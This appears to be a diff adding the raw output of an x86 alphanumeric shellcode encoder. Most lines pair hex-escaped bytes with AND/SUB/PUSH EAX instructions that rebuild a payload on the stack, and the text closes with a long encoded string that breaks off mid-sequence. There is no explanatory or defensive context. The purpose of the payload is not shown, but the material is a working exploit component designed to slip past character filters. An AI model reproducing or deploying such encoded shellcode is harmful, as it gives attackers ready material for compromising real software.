+ \x2d\x32\x34\x30\x33 : SUB EAX,0x33303432
+ \x2d\x32\x34\x30\x33 : SUB EAX,0x33303432
+ \x2d\x34\x34\x32\x35 : SUB EAX,0x35323434
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x3b\x34\x55\x63 : SUB EAX,0x6355343b
+ \x2d\x3b\x34\x55\x63 : SUB EAX,0x6355343b
+ \x2d\x3d\x36\x56\x63 : SUB EAX,0x6356363d
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x23\x32\x2e\x30 : SUB EAX,0x302e3223
+ \x2d\x23\x32\x2e\x30 : SUB EAX,0x302e3223
+ \x2d\x23\x33\x2e\x31 : SUB EAX,0x312e3323
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x5f\x55\x63\x37 : SUB EAX,0x3763555f
+ \x2d\x5f\x55\x63\x37 : SUB EAX,0x3763555f
+ \x2d\x61\x55\x63\x39 : SUB EAX,0x39635561
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x32\x2d\x5b\x41 : SUB EAX,0x415b2d32
+ \x2d\x32\x2d\x5b\x41 : SUB EAX,0x415b2d32
+ \x2d\x34\x31\x5d\x41 : SUB EAX,0x415d3134
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x55\x55\x63\x37 : SUB EAX,0x37635555
+ \x2d\x55\x55\x63\x37 : SUB EAX,0x37635555
+ \x2d\x57\x55\x63\x39 : SUB EAX,0x39635557
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x32\x6d\x5c\x42 : SUB EAX,0x425c6d32
+ \x2d\x32\x6d\x5c\x42 : SUB EAX,0x425c6d32
+ \x2d\x34\x6e\x5d\x42 : SUB EAX,0x425d6e34
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x33\x55\x63\x37 : SUB EAX,0x37635533
+ \x2d\x33\x55\x63\x37 : SUB EAX,0x37635533
+ \x2d\x33\x56\x63\x39 : SUB EAX,0x39635633
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x32\x69\x61\x42 : SUB EAX,0x42616932
+ \x2d\x32\x69\x61\x42 : SUB EAX,0x42616932
+ \x2d\x34\x6b\x61\x43 : SUB EAX,0x43616b34
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x32\x4f\x38\x38 : SUB EAX,0x38384f32
+ \x2d\x32\x4f\x38\x38 : SUB EAX,0x38384f32
+ \x2d\x32\x51\x39\x38 : SUB EAX,0x38395132
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x4f\x36\x27\x5d : SUB EAX,0x5d27364f
+ \x2d\x4f\x36\x27\x5d : SUB EAX,0x5d27364f
+ \x2d\x51\x37\x28\x5f : SUB EAX,0x5f283751
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x23\x32\x54\x55 : SUB EAX,0x55543223
+ \x2d\x23\x32\x54\x55 : SUB EAX,0x55543223
+ \x2d\x23\x33\x55\x55 : SUB EAX,0x55553323
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x60\x5f\x55\x63 : SUB EAX,0x63555f60
+ \x2d\x60\x5f\x55\x63 : SUB EAX,0x63555f60
+ \x2d\x61\x60\x55\x63 : SUB EAX,0x63556061
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x39\x32\x5c\x4f : SUB EAX,0x4f5c3239
+ \x2d\x39\x32\x5c\x4f : SUB EAX,0x4f5c3239
+ \x2d\x3e\x33\x5d\x51 : SUB EAX,0x515d333e
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x56\x3e\x39\x3e : SUB EAX,0x3e393e56
+ \x2d\x56\x3e\x39\x3e : SUB EAX,0x3e393e56
+ \x2d\x57\x42\x3d\x43 : SUB EAX,0x433d4257
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x52\x37\x39\x5f : SUB EAX,0x5f393752
+ \x2d\x52\x37\x39\x5f : SUB EAX,0x5f393752
+ \x2d\x54\x38\x3d\x5f : SUB EAX,0x5f3d3854
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x55\x55\x63\x31 : SUB EAX,0x31635555
+ \x2d\x55\x55\x63\x31 : SUB EAX,0x31635555
+ \x2d\x56\x56\x63\x32 : SUB EAX,0x32635656
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x32\x47\x2a\x31 : SUB EAX,0x312a4732
+ \x2d\x32\x47\x2a\x31 : SUB EAX,0x312a4732
+ \x2d\x34\x48\x2b\x32 : SUB EAX,0x322b4834
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x47\x69\x37\x39 : SUB EAX,0x39376947
+ \x2d\x47\x69\x37\x39 : SUB EAX,0x39376947
+ \x2d\x49\x69\x3c\x3d : SUB EAX,0x3d3c6949
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x25\x54\x55\x55 : SUB EAX,0x55555425
+ \x2d\x25\x54\x55\x55 : SUB EAX,0x55555425
+ \x2d\x26\x56\x55\x55 : SUB EAX,0x55555626
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x53\x55\x63\x6c : SUB EAX,0x6c635553
+ \x2d\x53\x55\x63\x6c : SUB EAX,0x6c635553
+ \x2d\x53\x56\x63\x6e : SUB EAX,0x6e635653
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x32\x3b\x2d\x48 : SUB EAX,0x482d3b32
+ \x2d\x32\x3b\x2d\x48 : SUB EAX,0x482d3b32
+ \x2d\x34\x3d\x2e\x49 : SUB EAX,0x492e3d34
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x2e\x44\x35\x39 : SUB EAX,0x3935442e
+ \x2d\x2e\x44\x35\x39 : SUB EAX,0x3935442e
+ \x2d\x31\x45\x36\x39 : SUB EAX,0x39364531
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x55\x55\x32\x2d : SUB EAX,0x2d325555
+ \x2d\x55\x55\x32\x2d : SUB EAX,0x2d325555
+ \x2d\x56\x55\x33\x2e : SUB EAX,0x2e335556
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x36\x32\x44\x44 : SUB EAX,0x44443236
+ \x2d\x36\x32\x44\x44 : SUB EAX,0x44443236
+ \x2d\x37\x33\x44\x45 : SUB EAX,0x45443337
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x27\x4f\x5c\x25 : SUB EAX,0x255c4f27
+ \x2d\x27\x4f\x5c\x25 : SUB EAX,0x255c4f27
+ \x2d\x27\x4f\x5c\x27 : SUB EAX,0x275c4f27
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x60\x35\x35\x37 : SUB EAX,0x37353560
+ \x2d\x60\x35\x35\x37 : SUB EAX,0x37353560
+ \x2d\x60\x35\x36\x37 : SUB EAX,0x37363560
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x37\x37\x39\x55 : SUB EAX,0x55393737
+ \x2d\x37\x37\x39\x55 : SUB EAX,0x55393737
+ \x2d\x39\x37\x3c\x56 : SUB EAX,0x563c3739
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x49\x36\x36\x34 : SUB EAX,0x34363649
+ \x2d\x49\x36\x36\x34 : SUB EAX,0x34363649
+ \x2d\x4a\x38\x38\x36 : SUB EAX,0x3638384a
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x65\x27\x3d\x49 : SUB EAX,0x493d2765
+ \x2d\x65\x27\x3d\x49 : SUB EAX,0x493d2765
+ \x2d\x66\x27\x41\x49 : SUB EAX,0x49412766
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x27\x53\x26\x54 : SUB EAX,0x54265327
+ \x2d\x27\x53\x26\x54 : SUB EAX,0x54265327
+ \x2d\x27\x55\x28\x56 : SUB EAX,0x56285527
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x38\x4b\x54\x64 : SUB EAX,0x64544b38
+ \x2d\x38\x4b\x54\x64 : SUB EAX,0x64544b38
+ \x2d\x38\x4d\x56\x64 : SUB EAX,0x64564d38
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x27\x51\x3c\x26 : SUB EAX,0x263c5127
+ \x2d\x27\x51\x3c\x26 : SUB EAX,0x263c5127
+ \x2d\x27\x51\x3c\x28 : SUB EAX,0x283c5127
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x49\x54\x64\x32 : SUB EAX,0x32645449
+ \x2d\x49\x54\x64\x32 : SUB EAX,0x32645449
+ \x2d\x4a\x56\x64\x34 : SUB EAX,0x3464564a
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x5e\x37\x26\x37 : SUB EAX,0x3726375e
+ \x2d\x5e\x37\x26\x37 : SUB EAX,0x3726375e
+ \x2d\x60\x38\x28\x39 : SUB EAX,0x39283860
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x41\x2b\x49\x2e : SUB EAX,0x2e492b41
+ \x2d\x41\x2b\x49\x2e : SUB EAX,0x2e492b41
+ \x2d\x43\x2c\x49\x2e : SUB EAX,0x2e492c43
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x58\x53\x2b\x57 : SUB EAX,0x572b5358
+ \x2d\x58\x53\x2b\x57 : SUB EAX,0x572b5358
+ \x2d\x5a\x55\x2c\x59 : SUB EAX,0x592c555a
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x68\x42\x5f\x2c : SUB EAX,0x2c5f4268
+ \x2d\x68\x42\x5f\x2c : SUB EAX,0x2c5f4268
+ \x2d\x69\x42\x61\x31 : SUB EAX,0x31614269
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x6a\x65\x50\x54 : SUB EAX,0x5450656a
+ \x2d\x6a\x65\x50\x54 : SUB EAX,0x5450656a
+ \x2d\x6b\x65\x51\x56 : SUB EAX,0x5651656b
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x63\x44\x55\x70 : SUB EAX,0x70554463
+ \x2d\x63\x44\x55\x70 : SUB EAX,0x70554463
+ \x2d\x64\x45\x56\x72 : SUB EAX,0x72564564
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x27\x43\x26\x54 : SUB EAX,0x54264327
+ \x2d\x27\x43\x26\x54 : SUB EAX,0x54264327
+ \x2d\x27\x45\x28\x56 : SUB EAX,0x56284527
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x4d\x5e\x41\x3c : SUB EAX,0x3c415e4d
+ \x2d\x4d\x5e\x41\x3c : SUB EAX,0x3c415e4d
+ \x2d\x4e\x60\x42\x3e : SUB EAX,0x3e42604e
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x55\x64\x26\x3c : SUB EAX,0x3c266455
+ \x2d\x55\x64\x26\x3c : SUB EAX,0x3c266455
+ \x2d\x55\x64\x27\x3e : SUB EAX,0x3e276455
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x39\x26\x37\x4a : SUB EAX,0x4a372639
+ \x2d\x39\x26\x37\x4a : SUB EAX,0x4a372639
+ \x2d\x3d\x28\x38\x4b : SUB EAX,0x4b38283d
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x5f\x3c\x54\x64 : SUB EAX,0x64543c5f
+ \x2d\x5f\x3c\x54\x64 : SUB EAX,0x64543c5f
+ \x2d\x5f\x3e\x56\x66 : SUB EAX,0x66563e5f
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x27\x3b\x4f\x2d : SUB EAX,0x2d4f3b27
+ \x2d\x27\x3b\x4f\x2d : SUB EAX,0x2d4f3b27
+ \x2d\x27\x3d\x50\x2d : SUB EAX,0x2d503d27
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x50\x26\x3c\x41 : SUB EAX,0x413c2650
+ \x2d\x50\x26\x3c\x41 : SUB EAX,0x413c2650
+ \x2d\x50\x28\x3d\x41 : SUB EAX,0x413d2850
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x39\x38\x26\x39 : SUB EAX,0x39263839
+ \x2d\x39\x38\x26\x39 : SUB EAX,0x39263839
+ \x2d\x3c\x38\x28\x3b : SUB EAX,0x3b28383c
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x55\x68\x5e\x59 : SUB EAX,0x595e6855
+ \x2d\x55\x68\x5e\x59 : SUB EAX,0x595e6855
+ \x2d\x55\x68\x60\x5a : SUB EAX,0x5a606855
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x4a\x6a\x65\x50 : SUB EAX,0x50656a4a
+ \x2d\x4a\x6a\x65\x50 : SUB EAX,0x50656a4a
+ \x2d\x4c\x6a\x65\x51 : SUB EAX,0x51656a4c
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x35\x2b\x54\x46 : SUB EAX,0x46542b35
+ \x2d\x35\x2b\x54\x46 : SUB EAX,0x46542b35
+ \x2d\x35\x2d\x55\x47 : SUB EAX,0x47552d35
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x45\x55\x70\x3e : SUB EAX,0x3e705545
+ \x2d\x45\x55\x70\x3e : SUB EAX,0x3e705545
+ \x2d\x45\x56\x72\x46 : SUB EAX,0x46725645
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x50\x6d\x3c\x48 : SUB EAX,0x483c6d50
+ \x2d\x50\x6d\x3c\x48 : SUB EAX,0x483c6d50
+ \x2d\x51\x6e\x3c\x49 : SUB EAX,0x493c6e51
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x4e\x26\x2e\x47 : SUB EAX,0x472e264e
+ \x2d\x4e\x26\x2e\x47 : SUB EAX,0x472e264e
+ \x2d\x50\x28\x31\x49 : SUB EAX,0x49312850
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x39\x51\x26\x39 : SUB EAX,0x39265139
+ \x2d\x39\x51\x26\x39 : SUB EAX,0x39265139
+ \x2d\x3c\x51\x28\x3b : SUB EAX,0x3b28513c
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x27\x39\x45\x26 : SUB EAX,0x26453927
+ \x2d\x27\x39\x45\x26 : SUB EAX,0x26453927
+ \x2d\x27\x3d\x45\x28 : SUB EAX,0x28453d27
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x5e\x44\x6a\x33 : SUB EAX,0x336a445e
+ \x2d\x5e\x44\x6a\x33 : SUB EAX,0x336a445e
+ \x2d\x5f\x45\x6b\x34 : SUB EAX,0x346b455f
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x55\x55\x35\x27 : SUB EAX,0x27355555
+ \x2d\x55\x55\x35\x27 : SUB EAX,0x27355555
+ \x2d\x56\x55\x35\x28 : SUB EAX,0x28355556
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x56\x5c\x29\x55 : SUB EAX,0x55295c56
+ \x2d\x56\x5c\x29\x55 : SUB EAX,0x55295c56
+ \x2d\x58\x5e\x2a\x55 : SUB EAX,0x552a5e58
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x58\x59\x47\x63 : SUB EAX,0x63475958
+ \x2d\x58\x59\x47\x63 : SUB EAX,0x63475958
+ \x2d\x59\x59\x47\x65 : SUB EAX,0x65475959
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x54\x55\x55\x55 : SUB EAX,0x55555554
+ \x2d\x54\x55\x55\x55 : SUB EAX,0x55555554
+ \x2d\x54\x55\x55\x55 : SUB EAX,0x55555554
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x38\x44\x64\x6b : SUB EAX,0x6b644438
+ \x2d\x38\x44\x64\x6b : SUB EAX,0x6b644438
+ \x2d\x38\x46\x65\x6d : SUB EAX,0x6d654638
+ \x50 : PUSH EAX
+ \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
+ \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
+ \x2d\x29\x5b\x4f\x39 : SUB EAX,0x394f5b29
+ \x2d\x29\x5b\x4f\x39 : SUB EAX,0x394f5b29
+ \x2d\x2b\x5d\x50\x39 : SUB EAX,0x39505d2b
+ \x50 : PUSH EAX
+
+[+] encoded string:
+\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x38\x55\x63\x2d\x55\x38\x55\x63\x2d\x56\x3c\x56\x63\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4f\x2e\x30\x31\x2d\x4f\x2e\x30\x31\x2d\x4f\x31\x30\x33\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2d\x53\x6c\x3d\x2d\x2d\x53\x6c\x3d\x2d\x31\x54\x6c\x3d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x52\x2a\x56\x5f\x2d\x52\x2a\x56\x5f\x2d\x52\x2b\x58\x60\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x63\x3e\x53\x2b\x2d\x63\x3e\x53\x2b\x2d\x65\x46\x53\x2d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x23\x6b\x20\x55\x2d\x23\x6b\x20\x55\x2d\x25\x6c\x21\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5f\x35\x32\x73\x2d\x5f\x35\x32\x73\x2d\x60\x37\x33\x73\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x63\x6b\x71\x68\x2d\x63\x6b\x71\x68\x2d\x65\x6d\x72\x69\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x28\x4b\x35\x55\x2d\x28\x4b\x35\x55\x2d\x29\x4c\x35\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x44\x32\x52\x2d\x55\x44\x32\x52\x2d\x57\x46\x33\x53\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x60\x39\x38\x3c\x2d\x60\x39\x38\x3c\x2d\x60\x3e\x39\x41\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x28\x55\x63\x27\x2d\x28\x55\x63\x27\x2d\x2a\x56\x63\x27\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x2c\x66\x3e\x2d\x32\x2c\x66\x3e\x2d\x34\x2e\x67\x43\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x38\x38\x38\x2d\x37\x38\x38\x38\x2d\x3c\x39\x3c\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x3c\x38\x3b\x2d\x37\x3c\x38\x3b\x2d\x3c\x41\x39\x3b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x38\x39\x38\x38\x2d\x38\x39\x38\x38\x2d\x3c\x3d\x39\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x68\x54\x3d\x2d\x50\x68\x54\x3d\x2d\x50\x69\x56\x41\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x26\x3d\x49\x2d\x55\x26\x3d\x49\x2d\x55\x26\x41\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3d\x49\x41\x54\x2d\x3d\x49\x41\x54\x2d\x42\x49\x41\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5f\x55\x32\x68\x2d\x5f\x55\x32\x68\x2d\x60\x57\x34\x68\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x4f\x37\x38\x2d\x32\x4f\x37\x38\x2d\x32\x4f\x38\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x38\x38\x44\x58\x2d\x38\x38\x44\x58\x2d\x39\x38\x46\x59\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x27\x5e\x37\x2d\x55\x27\x5e\x37\x2d\x56\x28\x60\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x34\x30\x33\x2d\x32\x34\x30\x33\x2d\x34\x34\x32\x35\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3b\x34\x55\x63\x2d\x3b\x34\x55\x63\x2d\x3d\x36\x56\x63\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x23\x32\x2e\x30\x2d\x23\x32\x2e\x30\x2d\x23\x33\x2e\x31\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5f\x55\x63\x37\x2d\x5f\x55\x63\x37\x2d\x61\x55\x63\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x2d\x5b\x41\x2d\x32\x2d\x5b\x41\x2d\x34\x31\x5d\x41\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x55\x63\x37\x2d\x55\x55\x63\x37\x2d\x57\x55\x63\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x6d\x5c\x42\x2d\x32\x6d\x5c\x42\x2d\x34\x6e\x5d\x42\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x33\x55\x63\x37\x2d\x33\x55\x63\x37\x2d\x33\x56\x63\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x69\x61\x42\x2d\x32\x69\x61\x42\x2d\x34\x6b\x61\x43\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x4f\x38\x38\x2d\x32\x4f\x38\x38\x2d\x32\x51\x39\x38\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4f\x36\x27\x5d\x2d\x4f\x36\x27\x5d\x2d\x51\x37\x28\x5f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x23\x32\x54\x55\x2d\x23\x32\x54\x55\x2d\x23\x33\x55\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x60\x5f\x55\x63\x2d\x60\x5f\x55\x63\x2d\x61\x60\x55\x63\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x39\x32\x5c\x4f\x